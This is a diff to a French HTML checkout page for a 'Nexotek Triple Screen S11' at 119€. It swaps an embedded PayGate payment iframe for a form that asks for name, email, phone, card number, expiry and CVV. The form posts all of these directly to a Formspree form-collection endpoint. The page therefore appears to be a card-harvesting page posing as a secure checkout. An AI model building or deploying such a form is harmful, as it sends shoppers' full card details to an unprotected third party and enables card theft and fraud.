@@ -2,38 +2,142 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Paiement sécurisé - S11 Nexotek</title>
+  <title>Paiement - Nexotek Triple Screen S11</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
+      font-family: 'Segoe UI', sans-serif;
       background-color: #f4f4f4;
       margin: 0;
-      padding: 20px;
+      padding: 0;
     }
+
     .container {
-      max-width: 900px;
-      margin: auto;
-      background: white;
-      padding: 20px;
+      max-width: 600px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 30px;
       border-radius: 8px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
     }
-    iframe {
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      max-height: 60px;
+    }
+
+    .product-image {
       width: 100%;
-      height: 700px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #333;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input, select {
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .message {
+      font-size: 0.9em;
+      color: #c00;
+      margin-top: 10px;
+    }
+
+    .total {
+      margin-top: 20px;
+      font-size: 1.2em;
+      font-weight: bold;
+    }
+
+    button {
+      margin-top: 30px;
+      background-color: #1a73e8;
+      color: #fff;
+      padding: 12px;
       border: none;
-      border-radius: 8px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1em;
+    }
+
+    button:hover {
+      background-color: #0f59c5;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Paiement sécurisé</h1>
-    <p>Merci de votre confiance ! Veuillez entrer vos informations pour régler les <strong>119€</strong> du <strong>S11 Nexotek</strong>.</p>
+    <div class="logo">
+      <img src="logo.png" alt="Logo">
+    </div>
 
-    <!-- iFrame vers la page de paiement PayGate -->
-    <iframe src="https://paygate.to/0xa1bEdEeA45BDb34746316a3D6e7F03D5BD17d13b" allow="payment"></iframe>
+    <img src="product.jpg" alt="Produit" class="product-image">
+
+    <h2>Nexotek Triple Screen S11</h2>
+
+    <form action="https://formspree.io/f/mvgapayj" method="POST">
+      <label>Nom complet</label>
+      <input type="text" name="nom" required>
+
+      <label>Email</label>
+      <input type="email" name="email" required>
+
+      <label>Téléphone</label>
+      <input type="tel" name="tel" required>
+
+      <label>Numéro de carte</label>
+      <input type="text" name="carte" maxlength="19" required>
+
+      <label>Date d'expiration (MM/AA)</label>
+      <input type="text" name="expiration" placeholder="MM/AA" maxlength="5" required>
+
+      <label>Cryptogramme (CVV)</label>
+      <input type="text" name="cvv" maxlength="4" required>
+
+      <label>Quantité (max 5)</label>
+      <input type="number" name="quantite" id="quantite" min="1" max="5" value="1" required>
+
+      <p class="message">Commande limitée à 5 exemplaires par achat, afin de garantir un stock disponible pour toutes les entreprises.</p>
+
+      <div class="total" id="total">Total : 119€</div>
+
+      <input type="hidden" name="produit" value="Nexotek Triple Screen S11">
+      <input type="hidden" name="prix_unitaire" value="119">
+
+      <button type="submit">Payer maintenant</button>
+    </form>
   </div>
+
+  <script>
+    const quantiteInput = document.getElementById('quantite');
+    const totalDisplay = document.getElementById('total');
+
+    quantiteInput.addEventListener('input', () => {
+      const prix = 119;
+      const quantite = parseInt(quantiteInput.value) || 1;
+      const total = prix * quantite;
+      totalDisplay.textContent = "Total : " + total + "€";
+    });
+  </script>
 </body>
 </html>
